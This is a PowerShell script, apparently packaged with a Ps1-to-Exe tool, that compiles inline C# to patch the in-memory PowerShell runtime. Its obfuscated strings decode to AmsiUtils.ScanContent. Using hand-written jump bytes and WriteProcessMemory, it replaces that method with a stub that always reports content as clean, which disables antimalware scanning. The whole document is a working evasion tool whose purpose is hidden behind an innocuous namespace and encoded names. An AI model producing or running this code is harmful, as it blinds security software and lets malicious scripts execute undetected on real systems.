##[Ps1 To Exe]
##
##Kd3HDZOFADWE8uK1
##Nc3NCtDXThU=
##Kd3HFJGZHWLWoLaVvnQnhQ==
##LM/RF4eFHHGZ7/K1
##K8rLFtDXTiW5
##OsHQCZGeTiiZ4NI=
##OcrLFtDXTiW5
##LM/BD5WYTiiZ49I=
##McvWDJ+OTiiZ4tI=
##OMvOC56PFnzN8u+Vs1Q=
##M9jHFoeYB2Hc8u+Vs1Q=
##PdrWFpmIG2HcofKIo2QX
##OMfRFJyLFzWE8uK1
##KsfMAp/KUzWJ0g==
##OsfOAYaPHGbQvbyVvnQX
##LNzNAIWJGmPcoKHc7Do3uAuO
##LNzNAIWJGnvYv7eVvnQX
##M9zLA5mED3nfu77Q7TV64AuzAgg=
##NcDWAYKED3nfu77Q7TV64AuzAgg=
##OMvRB4KDHmHQvbyVvnQX
##P8HPFJGEFzWE8tI=
##KNzDAJWHD2fS8u+Vgw==
##P8HSHYKDCX3N8u+Vgw==
##LNzLEpGeC3fMu77Ro2k3hQ==
##L97HB5mLAnfMu77Ro2k3hQ==
##P8HPCZWEGmaZ7/K1
##L8/UAdDXTlODjpDM8zVk9mrDcUEIYteztrmszY+7raTpoyC5
##Kc/BRM3KXhU=
##
##
##fd6a9f26a06ea3bc99616d4851b372ba

$code = @"
using System;
using System.ComponentModel;
using System.Management.Automation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
namespace Editor {
    public static class Methods {
        public static void Patch() {
            MethodInfo original = typeof(PSObject).Assembly.GetType(Methods.CLASS).GetMethod(Methods.METHOD, BindingFlags.NonPublic | BindingFlags.Static);
            MethodInfo replacement = typeof(Methods).GetMethod("Dummy", BindingFlags.NonPublic | BindingFlags.Static);
            Methods.Patch(original, replacement);
        }
        [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
        private static int Dummy(string content, string metadata) {
            return 1;
        }
        public static void Patch(MethodInfo original, MethodInfo replacement) {
            //JIT compile methods
            RuntimeHelpers.PrepareMethod(original.MethodHandle);
            RuntimeHelpers.PrepareMethod(replacement.MethodHandle);
            //Get pointers to the functions
            IntPtr originalSite = original.MethodHandle.GetFunctionPointer();
            IntPtr replacementSite = replacement.MethodHandle.GetFunctionPointer();
            //Generate architecture specific shellcode
            byte[] patch = null;
            if (IntPtr.Size == 8) {
                patch = new byte[] { 0x49, 0xbb, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0xff, 0xe3 };
                byte[] address = BitConverter.GetBytes(replacementSite.ToInt64());
                for (int i = 0; i < address.Length; i++) {
                    patch[i + 2] = address[i];
                }
            } else {
                patch = new byte[] { 0x68, 0x0, 0x0, 0x0, 0x0, 0xc3 };
                byte[] address = BitConverter.GetBytes(replacementSite.ToInt32());
                for (int i = 0; i < address.Length; i++) {
                    patch[i + 1] = address[i];
                }
            }
            //Temporarily change permissions to RWE
            uint oldprotect;
            if (!VirtualProtect(originalSite, (UIntPtr)patch.Length, 0x40, out oldprotect)) {
                throw new Win32Exception();
            }
            //Apply the patch
            IntPtr written = IntPtr.Zero;
            if (!Methods.WriteProcessMemory(GetCurrentProcess(), originalSite, patch, (uint)patch.Length, out written)) {
                throw new Win32Exception();
            }
            //Flush insutruction cache to make sure our new code executes
            if (!FlushInstructionCache(GetCurrentProcess(), originalSite, (UIntPtr)patch.Length)) {
                throw new Win32Exception();
            }
            //Restore the original memory protection settings
            if (!VirtualProtect(originalSite, (UIntPtr)patch.Length, oldprotect, out oldprotect)) {
                throw new Win32Exception();
            }
        }
        private static string Transform(string input) {
            StringBuilder builder = new StringBuilder(input.Length + 1);    
            foreach(char c in input) {
                char m = (char)((int)c - 1);
                builder.Append(m);
            }
            return builder.ToString();
        }
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
        private static readonly string CLASS = Methods.Transform("Tztufn/Nbobhfnfou/Bvupnbujpo/BntjVujmt");
        private static readonly string METHOD = Methods.Transform("TdboDpoufou");
    }
}
"@
Add-Type $code
[Editor.Methods]::Patch()
